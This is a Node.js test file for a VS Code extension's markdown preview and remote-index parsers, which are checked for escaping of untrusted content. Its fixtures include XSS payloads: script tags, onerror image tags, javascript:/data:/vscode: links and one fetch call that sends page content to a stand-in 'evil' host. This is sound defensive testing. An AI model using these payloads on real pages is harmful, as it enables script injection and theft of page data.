#!/usr/bin/env node

// SKILL.md は任意の GitHub リポジトリから取得する untrusted な入力なので、
// Webview へ渡る前のレンダリングだけを切り出して検証する。

const assert = require("assert");
const fs = require("fs");
const Module = require("module");
const path = require("path");
const ts = require("typescript");

const STUBBED = new Set([
  "vscode",
  "./skillIndex",
  "./i18n",
  "./githubAuth",
  "./githubFetch",
  "./githubResponse",
  "./constants",
  "./sourceUpdateReconcile",
]);

const originalLoad = Module._load;
Module._load = function patchedLoad(request, parent, isMain) {
  if (STUBBED.has(request)) {
    return {};
  }
  // vscode 非依存の純粋ヘルパーは実モジュールを使う。書き写すと実装と乖離する
  if (request === "./sourceRefs") {
    return requireTypeScriptModule(
      path.join(__dirname, "..", "src", "sourceRefs.ts"),
    );
  }
  return originalLoad.call(this, request, parent, isMain);
};

function requireTypeScriptModule(filePath) {
  const transpiled = ts.transpileModule(fs.readFileSync(filePath, "utf8"), {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2020,
    },
    fileName: filePath,
  });

  const loaded = new Module(filePath, module);
  loaded.filename = filePath;
  loaded.paths = Module._nodeModulePaths(path.dirname(filePath));
  loaded._compile(transpiled.outputText, filePath);
  return loaded.exports;
}

function test(name, fn) {
  try {
    fn();
    console.log(`PASS ${name}`);
  } catch (error) {
    console.error(`FAIL ${name}`);
    throw error;
  }
}

function main() {
  const { markdownToHtml } = requireTypeScriptModule(
    path.join(__dirname, "..", "src", "skillPreview.ts"),
  );

  test("escapes raw HTML in the document body", () => {
    const html = markdownToHtml(
      "<script>alert(1)</script>\n\n<img src=x onerror=alert(2)>",
    );

    assert.ok(!/<script/i.test(html), "a script tag must never survive");
    assert.ok(!/<img/i.test(html), "an image tag must never survive");
    assert.ok(html.includes("&lt;script&gt;"));
  });

  test("escapes fenced and inline code instead of rendering it", () => {
    const html = markdownToHtml(
      "```html\n<img src=x onerror=alert(1)>\n```\n\nand `<b>bold</b>`",
    );

    assert.ok(!/<img/i.test(html));
    assert.ok(!/<b>/i.test(html));
    assert.ok(html.includes('<pre><code class="language-html">'));
  });

  test("neutralizes dangerous link protocols", () => {
    for (const href of [
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      "data:text/html;base64,PHNjcmlwdD4=",
      "vscode://command/workbench.action.terminal.new",
      "//evil.example.com/x",
    ]) {
      const html = markdownToHtml(`[click](${href})`);
      assert.ok(
        html.includes('href="#"'),
        `${href} must be reduced to an inert link, got ${html}`,
      );
    }
  });

  test("keeps ordinary links usable", () => {
    const html = markdownToHtml(
      "[docs](https://example.com/a?b=c) and [top](#intro)",
    );

    assert.ok(html.includes('href="https://example.com/a?b=c"'));
    assert.ok(html.includes('href="#intro"'));
    assert.ok(html.includes('rel="noopener noreferrer"'));
  });

  test("does not let the document forge an internal placeholder", () => {
    // レンダラは一時マーカーで安全な断片を退避する。
    // マーカーを本文に書ける限り、別ブロックの内容へ差し替えられる
    const html = markdownToHtml(
      "```\nSECRET_BLOCK_CONTENT\n```\n\n@@SKILL_NINJA_PH_0@@",
    );

    const occurrences = html.split("SECRET_BLOCK_CONTENT").length - 1;
    assert.strictEqual(
      occurrences,
      1,
      "a literal marker in the document must not duplicate another block",
    );
  });

  test("renders headings, emphasis and lists", () => {
    const html = markdownToHtml(
      "# Title\n\n- one\n- two\n\n**bold** and *soft*",
    );

    assert.ok(html.includes("<h1>Title</h1>"));
    assert.ok(html.includes("<ul><li>one</li><li>two</li></ul>"));
    assert.ok(html.includes("<strong>bold</strong>"));
    assert.ok(html.includes("<em>soft</em>"));
  });

  const { normalizeStarCount, normalizeIndexText, normalizeIndexTags } =
    requireTypeScriptModule(
      path.join(__dirname, "..", "src", "indexUpdater.ts"),
    );

  test("drops a star count that a remote index did not send as a number", () => {
    assert.strictEqual(normalizeStarCount(1234), 1234);
    assert.strictEqual(normalizeStarCount(0), 0);
    for (const hostile of [
      '<img src=x onerror="fetch(`https://evil/`+document.body.innerHTML)">',
      "12",
      -1,
      Number.NaN,
      Number.POSITIVE_INFINITY,
      { toLocaleString: () => "<b>x</b>" },
      null,
      undefined,
    ]) {
      assert.strictEqual(
        normalizeStarCount(hostile),
        undefined,
        `${String(hostile)} must not reach the preview as a star count`,
      );
    }
  });

  test("the preview escapes the star count it renders", () => {
    const source = fs.readFileSync(
      path.join(__dirname, "..", "src", "skillPreview.ts"),
      "utf8",
    );

    assert.ok(
      source.includes("escapeHtml(skill.stars.toLocaleString())"),
      "the star count is remote data and must be escaped at the HTML boundary",
    );
  });

  test("keeps only real strings from a remote index", () => {
    assert.strictEqual(normalizeIndexText("demo-skill"), "demo-skill");
    for (const hostile of [42, "", "   ", null, undefined, {}, ["a"]]) {
      assert.strictEqual(
        normalizeIndexText(hostile),
        undefined,
        `${JSON.stringify(hostile)} must not become a skill field`,
      );
    }
  });

  test("keeps only string tags from a remote index", () => {
    assert.deepStrictEqual(normalizeIndexTags(["a", 1, "", null, "b"]), [
      "a",
      "b",
    ]);
    for (const hostile of ["a,b", 1, null, undefined, { 0: "a" }]) {
      assert.deepStrictEqual(
        normalizeIndexTags(hostile),
        [],
        `${JSON.stringify(hostile)} must not be spread into categories`,
      );
    }
  });

  test("remote index parsers never copy a raw field into a Skill", () => {
    const source = fs.readFileSync(
      path.join(__dirname, "..", "src", "indexUpdater.ts"),
      "utf8",
    );

    // GitHub API 由来の item は型が保証されるので、ソース提供の index を読む 2 関数だけを見る
    const parserBody = (signature) => {
      const start = source.indexOf(signature);
      assert.ok(start >= 0, `${signature} not found`);
      const end = source.indexOf("\nfunction ", start + 1);
      return source.slice(start, end === -1 ? undefined : end);
    };

    for (const signature of [
      "function parseSearchIndex(",
      "function parseRegistryJson(",
    ]) {
      const body = parserBody(signature);
      for (const raw of [
        /stars:\s*item\./,
        /name:\s*item\./,
        /path:\s*item\./,
        /description:\s*item\./,
      ]) {
        assert.ok(
          !raw.test(body),
          `${signature} must normalize before use, found ${raw}`,
        );
      }
    }
  });

  console.log("Untrusted source content tests passed.");
}

try {
  main();
} finally {
  Module._load = originalLoad;
}
